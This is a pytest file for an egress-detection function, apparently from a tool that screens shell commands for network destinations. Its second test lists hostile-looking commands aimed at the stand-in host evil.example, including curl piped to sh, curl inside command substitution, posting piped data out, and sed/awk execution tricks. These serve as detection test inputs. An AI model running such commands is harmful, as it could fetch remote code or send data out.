"""URLs in text that never reaches the network are not egress destinations.

From the false-positive catalog: commit messages, PR bodies, heredocs written
to a file, and printf/sed/echo text were all blocked as egress. Anything that
could execute that text keeps the full scan.
"""
import pytest

from prismor.runtime.egress import extract_destinations


def _hosts(command):
    return sorted({d.host for d in extract_destinations({"type": "shell", "command": command})})


@pytest.mark.parametrize("command", [
    "cat > notes.md <<'EOF'\nSee https://example.com/docs\nEOF",
    "git commit -m 'docs: link https://example.com/bar'",
    "printf 'visit https://evil.example\\n' > out.txt",
    "sed -i 's#https://old.example#https://new.example#' README.md",
    "gh pr create --title x --body 'see https://example.com'",
    "echo 'https://example.com' >> links.txt",
    "git commit -F - <<'EOF'\nFixes https://example.com/issue/1\nEOF",
])
def test_inert_text_is_not_a_destination(command):
    assert _hosts(command) == []


@pytest.mark.parametrize("command", [
    "curl https://evil.example/x",
    "echo 'curl https://evil.example' | sh",
    "sh <<'EOF'\ncurl https://evil.example/x\nEOF",
    "cat <<'EOF' | bash\ncurl https://evil.example/x\nEOF",
    "git commit -m \"$(curl https://evil.example)\"",
    "printf x | tee >(curl https://evil.example -d @-)",
    "ssh box <<'EOF'\ncurl https://evil.example\nEOF",
    "cat > x.sh <<'EOF'\ncurl https://evil.example\nEOF\nbash x.sh",
    "sed -n '1e curl https://evil.example' f",
    "awk 'BEGIN{system(\"curl https://evil.example\")}'",
])
def test_text_that_can_run_is_still_screened(command):
    assert "evil.example" in _hosts(command)
